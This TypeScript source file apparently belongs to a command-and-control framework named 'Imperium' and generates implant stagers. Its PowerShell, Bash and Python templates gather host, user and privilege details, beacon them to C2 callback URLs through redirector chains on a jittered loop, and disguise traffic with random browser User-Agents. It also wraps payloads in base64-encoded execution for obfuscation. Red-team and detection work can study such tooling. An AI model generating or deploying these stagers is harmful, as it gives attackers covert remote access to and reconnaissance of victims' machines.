import { PrismaClient } from '@prisma/client';
import { cryptoService } from './cryptoService.js';

const prisma = new PrismaClient();

/**
 * PayloadService - Generates agent stagers/payloads
 * Creates payloads with embedded C2 configuration, callback URLs, and encryption keys
 */

export type PayloadFormat = 'powershell' | 'bash' | 'python' | 'exe' | 'dll' | 'raw';
export type PayloadArch = 'x64' | 'x86' | 'any';

export interface StagerConfig {
    listenerId: string;
    format: PayloadFormat;
    arch?: PayloadArch;
    obfuscate?: boolean;
    sleepInterval?: number;      // Beacon interval in seconds
    jitter?: number;             // Jitter percentage (0-100)
    killDate?: string;           // ISO date when agent self-destructs
    userAgent?: string;          // Custom User-Agent string
    customHeaders?: Record<string, string>;  // Additional HTTP headers
}

export interface GeneratedPayload {
    payload: string;             // Base64 encoded or text payload
    format: PayloadFormat;
    listenerId: string;
    callbackUrls: string[];      // Primary and fallback URLs
    agentId: string;             // Pre-generated agent ID
    publicKey: string;           // Server public key for key exchange
    checksum: string;            // SHA-256 hash of payload
    size: number;                // Payload size in bytes
    generatedAt: string;
}

class PayloadService {
    /**
     * Generate a stager payload
     */
    async generateStager(config: StagerConfig): Promise<GeneratedPayload> {
        // Get listener configuration
        const listener = await prisma.listener.findUnique({
            where: { id: config.listenerId }
        });

        if (!listener) {
            throw new Error(`Listener ${config.listenerId} not found`);
        }

        // Build callback URLs through redirector chain
        const callbackUrls = await this.buildCallbackUrls(listener);

        // Generate agent ID for this payload
        const agentId = cryptoService.generateAgentId();

        // Get server public key for key exchange
        await cryptoService.init();
        const publicKey = await cryptoService.getPublicKeyBase64();

        // Build agent configuration
        const agentConfig = {
            agentId,
            callbackUrls,
            publicKey,
            sleepInterval: config.sleepInterval || 60,
            jitter: config.jitter || 10,
            killDate: config.killDate || null,
            userAgent: config.userAgent || this.getRandomUserAgent(),
            headers: {
                ...(listener.hostHeader ? { 'Host': listener.hostHeader } : {}),
                ...(config.customHeaders || {})
            }
        };

        // Generate payload based on format
        let payload: string;
        switch (config.format) {
            case 'powershell':
                payload = this.generatePowershellStager(agentConfig, config.obfuscate);
                break;
            case 'bash':
                payload = this.generateBashStager(agentConfig, config.obfuscate);
                break;
            case 'python':
                payload = this.generatePythonStager(agentConfig, config.obfuscate);
                break;
            case 'raw':
                payload = Buffer.from(JSON.stringify(agentConfig)).toString('base64');
                break;
            default:
                throw new Error(`Unsupported payload format: ${config.format}`);
        }

        // Calculate checksum
        const checksum = cryptoService.sha256(payload);

        return {
            payload,
            format: config.format,
            listenerId: config.listenerId,
            callbackUrls,
            agentId,
            publicKey,
            checksum,
            size: Buffer.from(payload).length,
            generatedAt: new Date().toISOString()
        };
    }

    /**
     * Build callback URLs through redirector chain
     * Returns array of URLs for primary and fallback connections
     */
    private async buildCallbackUrls(listener: any): Promise<string[]> {
        const urls: string[] = [];

        // Check if listener has a route configured
        const route = await prisma.redirectorRoute.findFirst({
            where: { listenerId: listener.id, active: true }
        });

        if (route) {
            // Build URL through redirector chain
            const hops = JSON.parse(route.hops) as string[];
            if (hops.length > 0) {
                // Get the first hop (edge redirector)
                const edgeRedirector = await prisma.redirector.findUnique({
                    where: { id: hops[0] }
                });

                if (edgeRedirector) {
                    const protocol = listener.type === 'HTTPS' ? 'https' : 'http';
                    urls.push(`${protocol}://${edgeRedirector.ip}:${listener.port}`);
                }
            }
        }

        // If no route, or as fallback, use direct listener address
        if (urls.length === 0) {
            const protocol = listener.type === 'HTTPS' ? 'https' : 'http';
            const host = listener.host === '0.0.0.0' ? '127.0.0.1' : listener.host;
            urls.push(`${protocol}://${host}:${listener.port}`);
        }

        // Add any additional redirectors as fallbacks
        if (listener.redirectorId) {
            const redirector = await prisma.redirector.findUnique({
                where: { id: listener.redirectorId }
            });
            if (redirector) {
                const protocol = listener.type === 'HTTPS' ? 'https' : 'http';
                const fallbackUrl = `${protocol}://${redirector.ip}:${listener.port}`;
                if (!urls.includes(fallbackUrl)) {
                    urls.push(fallbackUrl);
                }
            }
        }

        return urls;
    }

    /**
     * Generate PowerShell stager
     */
    private generatePowershellStager(config: any, obfuscate?: boolean): string {
        const configB64 = Buffer.from(JSON.stringify(config)).toString('base64');

        let stager = `
# Imperium Agent Stager
$Config = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${configB64}')) | ConvertFrom-Json

# Generate AES session key
$SessionKey = [byte[]]::new(32)
[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($SessionKey)

# Import server public key
$RSA = [System.Security.Cryptography.RSA]::Create()
$RSA.ImportSubjectPublicKeyInfo([System.Convert]::FromBase64String($Config.publicKey), [ref]$null)

# Encrypt session key
$EncryptedKey = $RSA.Encrypt($SessionKey, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)

# Collect system info
$SystemInfo = @{
    agentId = $Config.agentId
    os = 'windows'
    osVersion = [System.Environment]::OSVersion.VersionString
    hostname = $env:COMPUTERNAME
    user = $env:USERNAME
    privileges = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 'Admin' } else { 'User' }
    ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress
    externalIp = ''
    pid = $PID
    processName = (Get-Process -Id $PID).ProcessName + '.exe'
}

# Encrypt system info with AES
$AES = [System.Security.Cryptography.Aes]::Create()
$AES.Key = $SessionKey
$AES.GenerateIV()
$IV = $AES.IV

$JsonBytes = [System.Text.Encoding]::UTF8.GetBytes(($SystemInfo | ConvertTo-Json -Compress))
$Encryptor = $AES.CreateEncryptor()
$EncryptedData = $Encryptor.TransformFinalBlock($JsonBytes, 0, $JsonBytes.Length)

# Get auth tag (for GCM mode simulation with CBC + HMAC)
$HMAC = [System.Security.Cryptography.HMACSHA256]::new($SessionKey)
$Tag = $HMAC.ComputeHash($EncryptedData)

# Build beacon request
$Beacon = @{
    type = 'checkin'
    sessionKey = [System.Convert]::ToBase64String($EncryptedKey)
    data = @{
        iv = [System.Convert]::ToBase64String($IV)
        data = [System.Convert]::ToBase64String($EncryptedData)
        tag = [System.Convert]::ToBase64String($Tag[0..15])
    }
} | ConvertTo-Json -Compress

# Send check-in
$Headers = @{ 'Content-Type' = 'application/json' }
$Config.headers.PSObject.Properties | ForEach-Object { $Headers[$_.Name] = $_.Value }

foreach ($url in $Config.callbackUrls) {
    try {
        $Response = Invoke-RestMethod -Uri "$url/beacon" -Method POST -Body $Beacon -Headers $Headers -UseBasicParsing
        if ($Response.status -eq 'registered') {
            Write-Host "[+] Registered with C2: $url"
            # Start beacon loop...
            while ($true) {
                Start-Sleep -Seconds ($Config.sleepInterval + (Get-Random -Minimum 0 -Maximum ([int]($Config.sleepInterval * $Config.jitter / 100))))
                # Poll for tasks...
            }
        }
    } catch {
        Write-Host "[-] Failed to connect to $url"
    }
}
`;

        if (obfuscate) {
            stager = this.obfuscatePowershell(stager);
        }

        return stager;
    }

    /**
     * Generate Bash stager
     */
    private generateBashStager(config: any, obfuscate?: boolean): string {
        const configB64 = Buffer.from(JSON.stringify(config)).toString('base64');

        let stager = `#!/bin/bash
# Imperium Agent Stager

CONFIG='${configB64}'
CONFIG_JSON=$(echo "$CONFIG" | base64 -d)

AGENT_ID=$(echo "$CONFIG_JSON" | jq -r '.agentId')
CALLBACK_URLS=$(echo "$CONFIG_JSON" | jq -r '.callbackUrls[]')
SLEEP_INTERVAL=$(echo "$CONFIG_JSON" | jq -r '.sleepInterval')
JITTER=$(echo "$CONFIG_JSON" | jq -r '.jitter')

# Collect system info
OS="linux"
OS_VERSION=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2 || uname -r)
HOSTNAME=$(hostname)
USER=$(whoami)
PRIVILEGES=$(if [ "$(id -u)" -eq 0 ]; then echo "root"; else echo "User"; fi)
IP=$(hostname -I 2>/dev/null | awk '{print $1}' || ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d'/' -f1 | head -1)
PID=$$
PROCESS_NAME=$(basename "$0")

# Build system info JSON
SYSTEM_INFO=$(cat <<EOF
{
    "agentId": "$AGENT_ID",
    "os": "$OS",
    "osVersion": "$OS_VERSION",
    "hostname": "$HOSTNAME",
    "user": "$USER",
    "privileges": "$PRIVILEGES",
    "ip": "$IP",
    "externalIp": "",
    "pid": $PID,
    "processName": "$PROCESS_NAME"
}
EOF
)

# Generate session key (32 bytes)
SESSION_KEY=$(openssl rand -base64 32)

# For full implementation, would encrypt with server's RSA public key
# Simplified version for stager template

# Build beacon request
BEACON=$(cat <<EOF
{
    "type": "checkin",
    "agentId": "$AGENT_ID",
    "data": $(echo "$SYSTEM_INFO" | base64 -w0 | jq -R '{iv: "placeholder", data: ., tag: "placeholder"}')
}
EOF
)

# Send check-in
for url in $CALLBACK_URLS; do
    RESPONSE=$(curl -s -X POST "$url/beacon" \\
        -H "Content-Type: application/json" \\
        -d "$BEACON" 2>/dev/null)

    if echo "$RESPONSE" | grep -q "registered\\|ok"; then
        echo "[+] Registered with C2: $url"
        # Start beacon loop
        while true; do
            SLEEP_TIME=$((SLEEP_INTERVAL + RANDOM % (SLEEP_INTERVAL * JITTER / 100)))
            sleep $SLEEP_TIME
            # Poll for tasks...
        done
    fi
done

echo "[-] Failed to connect to any C2 server"
`;

        if (obfuscate) {
            stager = this.obfuscateBash(stager);
        }

        return stager;
    }

    /**
     * Generate Python stager
     */
    private generatePythonStager(config: any, obfuscate?: boolean): string {
        const configB64 = Buffer.from(JSON.stringify(config)).toString('base64');

        let stager = `#!/usr/bin/env python3
# Imperium Agent Stager

import base64
import json
import os
import platform
import random
import socket
import time
import urllib.request
import ssl

CONFIG = base64.b64decode('${configB64}').decode()
config = json.loads(CONFIG)

def get_system_info():
    return {
        'agentId': config['agentId'],
        'os': platform.system().lower(),
        'osVersion': platform.platform(),
        'hostname': socket.gethostname(),
        'user': os.getenv('USER', os.getenv('USERNAME', 'unknown')),
        'privileges': 'root' if os.geteuid() == 0 else 'User' if hasattr(os, 'geteuid') else 'User',
        'ip': socket.gethostbyname(socket.gethostname()),
        'externalIp': '',
        'pid': os.getpid(),
        'processName': os.path.basename(__file__)
    }

def send_beacon(url, data):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(
            f"{url}/beacon",
            data=json.dumps(data).encode(),
            headers={
                'Content-Type': 'application/json',
                'User-Agent': config.get('userAgent', 'Mozilla/5.0'),
                **config.get('headers', {})
            }
        )
        with urllib.request.urlopen(req, timeout=30, context=ctx) as resp:
            return json.loads(resp.read().decode())
    except Exception as e:
        return None

def main():
    system_info = get_system_info()

    # Simplified beacon (full implementation would use RSA/AES encryption)
    beacon = {
        'type': 'checkin',
        'agentId': config['agentId'],
        'data': {
            'iv': base64.b64encode(os.urandom(12)).decode(),
            'data': base64.b64encode(json.dumps(system_info).encode()).decode(),
            'tag': base64.b64encode(os.urandom(16)).decode()
        }
    }

    for url in config['callbackUrls']:
        response = send_beacon(url, beacon)
        if response and response.get('status') in ['registered', 'ok']:
            print(f"[+] Registered with C2: {url}")

            # Beacon loop
            while True:
                jitter = random.randint(0, int(config['sleepInterval'] * config['jitter'] / 100))
                time.sleep(config['sleepInterval'] + jitter)
                # Poll for tasks...

    print("[-] Failed to connect to any C2 server")

if __name__ == '__main__':
    main()
`;

        if (obfuscate) {
            stager = this.obfuscatePython(stager);
        }

        return stager;
    }

    /**
     * Simple PowerShell obfuscation
     */
    private obfuscatePowershell(code: string): string {
        // Base64 encode and create decoder
        const encoded = Buffer.from(code, 'utf16le').toString('base64');
        return `powershell -EncodedCommand ${encoded}`;
    }

    /**
     * Simple Bash obfuscation
     */
    private obfuscateBash(code: string): string {
        const encoded = Buffer.from(code).toString('base64');
        return `#!/bin/bash\neval "$(echo '${encoded}' | base64 -d)"`;
    }

    /**
     * Simple Python obfuscation
     */
    private obfuscatePython(code: string): string {
        const encoded = Buffer.from(code).toString('base64');
        return `#!/usr/bin/env python3\nimport base64;exec(base64.b64decode('${encoded}').decode())`;
    }

    /**
     * Get a random common User-Agent string
     */
    private getRandomUserAgent(): string {
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
        return userAgents[Math.floor(Math.random() * userAgents.length)];
    }

    /**
     * Get available payload formats
     */
    getAvailableFormats(): { format: PayloadFormat; description: string; platforms: string[] }[] {
        return [
            { format: 'powershell', description: 'PowerShell script stager', platforms: ['windows'] },
            { format: 'bash', description: 'Bash script stager', platforms: ['linux', 'macos'] },
            { format: 'python', description: 'Python script stager', platforms: ['windows', 'linux', 'macos'] },
            { format: 'raw', description: 'Raw JSON configuration', platforms: ['any'] }
        ];
    }
}

// Singleton instance
export const payloadService = new PayloadService();

// Export class for testing
export { PayloadService };
